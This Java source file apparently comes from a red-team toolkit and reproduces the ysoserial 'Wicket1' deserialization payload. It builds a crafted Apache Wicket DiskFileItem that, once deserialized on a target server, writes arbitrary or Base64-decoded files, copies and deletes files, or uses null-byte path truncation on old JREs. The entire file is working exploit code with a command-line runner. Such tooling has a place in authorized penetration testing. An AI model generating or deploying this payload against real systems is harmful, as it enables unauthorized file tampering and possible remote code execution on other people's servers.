package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.apache.commons.codec.binary.Base64;
import org.apache.wicket.util.io.DeferredFileOutputStream;
import org.apache.wicket.util.io.ThresholdingOutputStream;
import org.apache.wicket.util.upload.DiskFileItem;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Arrays;

@PayloadTest(harness = "ysoserial.test.payloads.FileUploadTest", flaky = "possible race condition")
@Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
@Authors({Authors.JACOBAINES})
public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {

    @Override
    public DiskFileItem getObject(String command) throws Exception {
        String[] parts = command.split(";");
        if (parts.length != 3) {
            throw new IllegalArgumentException("Bad command format.");
        }
        if ("copyAndDelete".equals(parts[0])) {
            return copyAndDelete(parts[1], parts[2]);
        } else if ("write".equals(parts[0])) {
            return write(parts[1], parts[2].getBytes("US-ASCII"));
        } else if ("writeB64".equals(parts[0])) {
            return write(parts[1], Base64.decodeBase64(parts[2]));
        } else if ("writeOld".equals(parts[0])) {
            return writeOldJre(parts[1], parts[2].getBytes("US-ASCII"));
        } else if ("writeOldB64".equals(parts[0])) {
            return writeOldJre(parts[1], Base64.decodeBase64(parts[2]));
        }
        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
    }

    @Override
    public void release(DiskFileItem obj) throws Exception {
    }

    private static DiskFileItem copyAndDelete(String copyAndDelete, String copyTo) throws Exception {
        return makePayload(0, copyTo, copyAndDelete, new byte[1]);
    }

    private static DiskFileItem write(String dir, byte[] data) throws Exception {
        return makePayload(data.length + 1, dir, dir + "/whatever", data);
    }

    private static DiskFileItem writeOldJre(String file, byte[] data) throws Exception {
        return makePayload(data.length + 1, file + "\0", file, data);
    }

    private static DiskFileItem makePayload(int threshold, String repoPath, String filePath, byte[] data)
            throws IOException, Exception {
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository, null);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(threshold, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Wicket1.class, args);
    }
}
